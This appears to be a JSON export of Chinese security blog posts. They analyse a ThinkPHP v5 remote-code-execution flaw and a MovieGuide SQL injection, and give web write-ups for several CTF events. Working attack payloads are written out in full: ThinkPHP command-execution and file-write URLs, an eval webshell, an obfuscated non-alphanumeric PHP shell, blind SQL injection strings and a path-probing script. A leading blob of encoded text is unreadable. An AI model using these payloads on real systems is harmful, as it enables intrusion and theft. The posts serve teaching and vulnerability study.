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"},{"title":"【Code Analysis】thinkphp v5.x App.php s参数RCE","permalink":"http://blog.0kami.cn/2019/02/05/php-thinkphp-v5-x-App-php-rce/","text":"概述放假了，对thinkphp的几个RCE做一下分析，记录一下XD thinkphp v5.0.x漏洞相关信息漏洞版本：&lt;= 5.0.22补丁：版本更新 · top-think/framework@4cbc0b5 · GitHub问题点：library/think/App.php 漏洞分析关于thinkphp的url解析方式THINKPHP支持使用PATHINFO的方式来访问具体的模块、类、方法，如index.php/module/controller/action对于不支持PATHINFO的服务器，THINKPHP提供了兼容模式?s=/module/controller/action的方式来访问而这次的漏洞成因就是在于兼容模式处理时存在的问题。首先看 thinkphp/library/think/Request.php的pathinfo函数 123456789101112131415161718public function pathinfo()&#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // 判断URL里面是否有兼容模式参数 $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLI模式下 index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // 分析PATHINFO信息 ... $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo;&#125; 当GET请求中带有s参数(config中默认var_pathinfo为s)，将pathinfo设置为s的参数值有了pathinfo值，我们再找到具体的解析url的函数，thinkphp/library/think/Route.php的parseUrl函数123456789101112public static function parseUrl($url, $depr = '/', $autoSearch = false)&#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // 如果有模块/控制器绑定 $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); $route = [null, null, null]; // ...&#125; 其中parseUrl函数的$url为上面拿到的pathinfo，$depr为默认的分割符首先对$url替换分割符为|，再输入到parseUrlPath函数(根据/分割)，该函数对pathinfo进行分割，产生module、controller、action那么现在来看rce的Poc?s=/index/\\think\\app/invokefunction=&gt;[module:index,controller:\\think\\app,action:invokefunction]其中controller=&gt;\\think\\app，是php命名空间的表示方式，\\think\\app实际调用library/think/App.php，后面的action实际调用的App.php中的invokefunction函数 漏洞成因点上面分析了thinkphp的兼容模式是如何处理s参数的，并且处理存在一个问题就是可以伪造controller，导致实际调用为其他的类和函数看一下拿到module、controller、action后系统的处理thinkphp/library/think/App.php 的 module函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // 设置默认过滤机制 $request-&gt;filter($config['default_filter']); ... try &#123; $instance = Loader::controller(// 实例化controller类 $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // 获取当前操作名 $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);// 调用函数&#125; 拿到实例化后的对象和方法，动态调用invokeMethod12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // 静态方法 $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars);// 获取参数内容 这里获取到参数用做method的参数输入 self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; 这里使用bindParams函数从get或post中获取到对应的内容，需要注意的是，做参数嵌入时，需要以函数的参数名为键如invokeFunction的参数为$function、$vars，那么在参数中就需要以function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx即poc的后半部分function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l所以调用链现在变成了 动态调用\\think\\app invokeFunction函数 提供function=call_user_func_array作为invokeFunction动态调用的参数，所以下一步调用call_user_func_array函数 call_user_func_array的参数为system函数，system函数的参数为ls -l，所以这里用了2维数组 所以我们可以发散一下思维，我们其实不单单可以调用\\think\\app这个类，如果其他的类可以任意调用其他函数，或者是调用命令执行函数，同样具有危害性如任意命令执行?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();任意文件写入，生成在index.php同一级目录?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();获取配置信息?s=index/\\think\\config/get&amp;name=database.username thinkphp v5.1.x版本信息版本：&lt;= v5.1.30补丁信息：修正控制器调用 · top-think/framework@802f284 · GitHub漏洞点：thinkphp/library/think/route/dispatch/Module.php 漏洞分析原理同v5.0.x版本类似，也是由于s参数带入的路径解析存在安全问题导致的任意代码执行先看App::run()1234567891011121314151617181920212223242526272829303132333435public function run()&#123; try &#123; // 初始化应用 $this-&gt;initialize(); ... $dispatch = $this-&gt;dispatch; if (empty($dispatch)) &#123; // 路由检测 $dispatch = $this-&gt;routeCheck()-&gt;init();// 处理module、controller、action &#125; // 记录当前调度信息 $this-&gt;request-&gt;dispatch($dispatch); ... &#125; catch (HttpResponseException $exception) &#123; $dispatch = null; $data = $exception-&gt;getResponse(); &#125; $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) &#123; return is_null($data) ? $dispatch-&gt;run() : $data; &#125;); $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// 动态调用controller、action ... return $response;&#125; App::run()函数体现了程序的一个主要流程，从路径的解析到动态解析执行相应的控制器及方法先来看看第13行，获取相应的路径信息thinkphp/library/think/App.php routeCheck()函数1234567891011121314151617181920public function routeCheck()&#123; // 检测路由缓存 ... // 获取应用调度信息 $path = $this-&gt;request-&gt;path(); // 从Request.php path提取urlpath 具体从pathinfo()，优先获取$_GET[$this-&gt;config['var_pathinfo']] // var_pathinfo 默认为s // 是否强制路由模式 $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must'); // 路由检测 返回一个Dispatch对象 $dispatch = $this-&gt;route-&gt;check($path, $must);//返回UrlDispatch类实例，从dispatch类处继承 ... return $dispatch;&#125; 第7行从s参数中获取路由路径(s为var_pathinfo的默认值)，在调用routeCheck函数后返回一个UrlDispatch，之后调用了Url类的init函数thinkphp/library/think/route/dispatch/Url.php init12345678public function init()&#123; // 解析默认的URL规则 $result = $this-&gt;parseUrl($this-&gt;dispatch); // parseUrl函数处理参数值(以/分割，传入|也行会被替换成/，最终由/来分割)，返回[module,controller,action] return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; 返回Module对象，继承自Dispatch对象，并且调用了init函数，将解析后的路由填充到dispatch，供后面App::run()函数动态调用dispatch的run函数，v5.1版本的调用链复杂了一点，但是其实内容同v5.0版本类似Dispatch::run()函数调用了Module::exec()函数thinkphp/library/think/route/dispatch/Module.php exec()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public function exec()&#123; // 监听module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // 实例化控制器 $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); if ($instance instanceof Controller) &#123; $instance-&gt;registerMiddleware(); &#125; &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // 闭包调用 $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // 获取当前操作名 $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // 自动获取请求变量 $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); $vars = array_merge($vars, $this-&gt;param); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; 简单描述exec函数，实例化controller，用于后面20行到55行的闭包函数，这个必报函数主要完成了调用controller的action，并获取输入的参数值，最后由invokeReflectMethod完成主要的调用。最终的调用函数为Request::filterValue函数123456789101112131415161718192021222324252627282930private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // 调用函数或者方法过滤 $value = call_user_func($filter, $value);//调用函数 &#125; elseif (is_scalar($value)) &#123; if (false !== strpos($filter, '/')) &#123; // 正则过滤 if (!preg_match($filter, $value)) &#123; // 匹配不成功返回默认值 $value = $default; break; &#125; &#125; elseif (!empty($filter)) &#123; // filter函数不存在时, 则使用filter_var进行过滤 // filter为非整形值时, 调用filter_id取得过滤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) &#123; $value = $default; break; &#125; &#125; &#125; &#125; return $value;&#125; 到这里其实思路很明显，利用/分割出能利用的controller，并输入相应的参数值，接下来就是找可利用的函数。v5.0版本中poc都能用 如任意命令执行?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();任意文件写入，生成在index.php同一级目录?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();获取配置信息?s=index/\\think\\config/get&amp;name=database.username除此之外，还可以使用\\think\\request/input（v5.0版本不能用是因为think\\request的构造函数为protected，不允许动态调用）如任意代码执行?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfoinvokeFunction核心ReflectionFunction?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1因为think\\app继承自think\\container，所以改成think\\app也行其中call_user_func填充参数时，以数组形式，第一个为函数名，第二个为函数参数call_user_func_array填充参数时，以数组形式，第一个为函数名，第二个为函数参数（也为数组形式）这里v5.1只能用php7，如v5.0还可以使用assert来执行函数 总结这次出的这个漏洞危害很大，整个调用过程也非常漂亮，值得一步一步调试。其中收获大致就是了解了thinkphp v5版本路由调用的流程，v5.1版本的闭包函数构造的方式给框架带来了不一样的感受，不得不给thinkphp一个赞"},{"title":"【CTF】SUCTF 2018 部分web writeup","permalink":"http://blog.0kami.cn/2018/05/28/ctf/suctf-part-web-writeup/","text":"SUCTF抽了点时间做了2道SUCTF的web题，记录一下writeup。 Anonymous考点php的动态函数执行，以及create_function所返回的匿名函数 wp访问题目，直接给了源码12345678910$MY = create_function(&quot;&quot;,&quot;some code&quot;); // 执行了cat命令，读取flag内容$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125; 思路比较明确，就是想办法执行create_function所产生的匿名函数。而其中SUCTF_32，这个函数明确是没办法爆破出来的。那么就只能在 $MY 上下功夫。打印一下$MY的值，发现create_function返回了\\0lambda_{number},那么就很明确了，只要暴力一下这个number就有一定几率执行该函数，这里我暴力了大概1000多就有2条执行了 Getshell考点https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html wp 首先确定可用字符，使用bp将所有可见字符暴力一遍后发现可打印字符为$ () [] _ ~ . ; =，以及其他不可打印字符。 根据p牛的博客，发现取反中文可以起到作用，测试~({中文})发现可根据中文的utf-8编码的中间2个hex码进行对字母的遍历http://www.herongyang.com/gb2312_gb/pinyin_32.html 凑出字符assert，_GET，并动态执行。为了凑出上面的字符，我采用逐个反取反bin2hex(~(&#39;a&#39;))获得中文utf-8编码的中间2个，搜表即可找到对应的中文，写一下我的getshell代码 123456789101112131415161718192021222324&lt;?php$_=~(瞎);$__.=$_[[]==[]];$_=~(挟);$__.=$_[[]==[]];$_=~(挟);$__.=$_[[]==[]];$_=~(隙);$__.=$_[[]==[]];$_=~(卸);$__.=$_[[]==[]];$_=~(勋);$__.=$_[[]==[]];$_=~(校);$___.=$_[[]==[]];$_=~(下);$___.=$_[[]==[]];$_=~(纤);$___.=$_[[]==[]];$_=~(嫌);$___.=$_[[]==[]];$___=$$___;$__($___[_]); 上传了shell之后就比较容易了，翻目录即可 12system(&apos;ls /&apos;)system(&apos;cat /Th1s_14_f14g&apos;) 总结记录一下getshell的坑点 eval不是函数，是语句 不用引号，用中文也被php当作是字符串 UTF-8编码 http://www.herongyang.com/gb2312_gb/pinyin_32.html"},{"title":"【CTF】DDCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/21/ctf/ddctf-2018-web-writeup/","text":"DDCTF 2018 2道WEB Writeup WEB00 数据库的秘密step 1:index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过 step 2:绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payloada%&#39; &amp;&amp; &#39;%&#39;=&#39;%、a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%确定注入存在,想着用union直接提取出来，发现后台还有WAF，没绕过去，但是对于盲注，成功构造出了payloada%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%,发生5秒延迟。（后来想想其实可以用bool型盲注提取数据） step 3:确认了author字段可以注入，但是这道题还有一个问题就是sha1校验，要想写脚本，必须先解决这个问题。研究了一下main.js，发现以类似id=title=date=author=time=的字符串sha1处理后后台校验 step 4:写脚本，主要包括sha1校验和时间盲注，贴一下payload 123456789101112payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# 获取到库名 ddctfpayload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# 获取到表名 message, ctf_key4payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# 获取到列名 ctf_key4:secvalue; message: id,title,author,time,statuspayload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# 获取到flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125; WEB01 专属链接step 1:根据题目提示，题目只跟链接IP有关，所以主要有1234http://116.85.48.102:5050/welcom/uuid #主页 注意到上面有email:3814166715717836733@didichuxing.comhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # 给了提示，只能下载.class,.ks,.ico,.xml文件http://116.85.48.102:5050/news/topFiveNews # 没用http://116.85.48.102:5050//flag/testflag/yourflag #访问报错，但是暴露了控制器路径com.didichuxing.ctf.controller.user.FlagController.java step 2:那么接下来就是猜路径了，在github上找了个springmvc+mybatis的项目,经过测试，发现一下几个文件 ../../WEB-INF/web.xml # 得到WEB-INF/applicationContext.xml，com.didichuxing.ctf.listener.InitListener ../../WEB-INF/applicationContext.xml # 得到classpath:mybatis/config.xml ../../WEB-INF/classes/mybatis/config.xml # 得到mapper/FlagMapper.xml ../../WEB-INF/classes/mapper/FlagMapper.xml # sql语句 ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class ../../WEB-INF/classes/sdl.ks # 密钥文件 ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class step 3:把上述的class文件在线反编译到java，阅读后发现flagController.java 12345678@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123; Flag flag = flagService.getFlagByEmail(email); return &quot;Encrypted flag : &quot; + flag.getFlag(); &#125; 以用户的邮箱来获取加密的flag，邮箱就是首页上的邮箱，然后通过listener.java得到具体的加密过程 12345678910111213String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);byte[] data = cipher.doFinal(flag.getBytes());byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e));flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); 可以看到Email被转化为16进制的形式，所以需要先对邮箱做处理，简单编写代码（后面放上来），得到8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27，以http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27请求后得到加密的flag。 step 4:接下来就是写代码解密flag了，因为密钥文件在手，只需编写程序即可，参考https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa需要注意的是这里用了私钥加密公钥解密。解密后得到flag"},{"title":"【CTF】HITB-XCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/","text":"upload 考点windows平台的一些特性 windows平台特性windows下搜索文件用到的是FindFirstFile，该函数执行时，会将&quot;&lt;&quot; =&gt; &quot;*&quot;、&quot;&gt;&quot; =&gt; &quot;?&quot;、&quot; =&gt; .，所以在应用中，我们可以使用这个特性。e.g. `?filename=a&gt; =&gt; a?` 匹配单个字符 `?filename=a&lt; =&gt; a*` 匹配多个字符 `?filename=a&quot; =&gt; a.` NTFS ADS特性 上传的文件名 系统结果 test.php:a.jpg 生成test.php，但是无内容 test.php::$DATA 生成test.php，有内容 test.php::$INDEX_ALLOCATION 生成test.php文件夹 test.php::$DATA.jpg 生成0.jpg，有内容 test.php::$DATA\\test.jpg 生成aaa.jpg，有内容 过程 step 1:功能点#文件上传 #上传文件宽高 =&gt; getshell环境：IIS7.0 Windows Server 2008 Standard Edition Service Pack 2 step 2:文件上传功能黑名单php，文件名前缀时间戳重写，但截取上传文件名的最后一个后缀不变。简单利用ADS特性，上传test.php::$DATA step 3:上传了文件后，需要找到文件目录。pic.php返回了上传文件宽和高，猜测其使用了getimagesize，想到前段时间的一篇帖子，写个脚本跑该复杂目录 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2018/4/11import requestsstr=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;ret=&quot;&quot;for i in range(32): for c in str: t=ret+c url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot; r=requests.get(url) if &quot;width&quot; in r.content: ret+=c print ret break 得到目录87194f13726af7cee27ba2cfe97b60df step 4:有了目录就能访问上传的一句话&lt;?php eval($_POST[cmd]);?&gt;，系统禁用了执行系统命令的一些函数，但是这里并不需要执行命令。这里不截图了cmd=var_dump(glob(&quot;../*&quot;));得到flag.php，访问后发现需要读取flag.php的内容cmd=echo readfile(&quot;../flag.php&quot;);得到flag 总结这次就做了一道web，还有待提高和积累:)"},{"title":"【Code Analysis】MovieGuide v2.0 SQLi","permalink":"http://blog.0kami.cn/2018/02/03/php/MovieGuide2SQLi/","text":"0x00Detail: Movie Guide v2.0 SQL Injection 0x01这是一个比较粗糙的开源cms，总体来说并没有对输入输出做安全处理，从PoC入手，选一个还原一下漏洞形成过程。 PoC：index.php?md=[SQL]定位一下md参数layout.php为该cms的主要入口处理,下述的变量均没有通过安全处理，直接SQL语句，从而都可以用于数据库注入。12345678//Get the passed variables.$mterm = filter_input(INPUT_POST, 'tterm');$cterm = filter_input(INPUT_POST, 'gterm');$lterm = filter_input(INPUT_GET, 'gterm');$yterm = filter_input(INPUT_GET, 'year');$md = filter_input(INPUT_GET, 'md');$actorname = filter_input(INPUT_GET, 'actor');$directorname = filter_input(INPUT_GET, 'director'); 直接拼接入SQL语句1$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;; 这里比较有意思的是它的PoC，以前没有见过类似的:b，PoC中使用了export_set函数 EXPORT_SET(bits,on,off[,separator[,number_of_bits]])Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of −1 is effectively the same as 64. 分解一下PoC123456789101112131415/*!02222UNION*/( /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239, ( /*!02222Select*/ export_set(5,@a:=0, (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a export_set(5, export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name] ,/*!02222column_name*/,&apos;\\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name] ) ,@a,2)//set @a split char ) ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239 )-- - 这里主要利用的是export_set函数的no，off位置来dump数据。 首先通过@a:=0，定义变量a为0（可能跟mysql版本有关系，5.7.x下的mysql无法用@:=0来定义） 最里面的export_set，将table_name dump出来（结果为0&lt;li&gt;table_name） 接下来的一个export_set，将columns_name dump出来(结果为0&lt;li&gt;table_name\\n:columns_name) select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\\n:&#39;,2)将上述的数据赋值给变量a 最后用最后一个export_set，用@a做分隔符，将数据dump出来 0x02 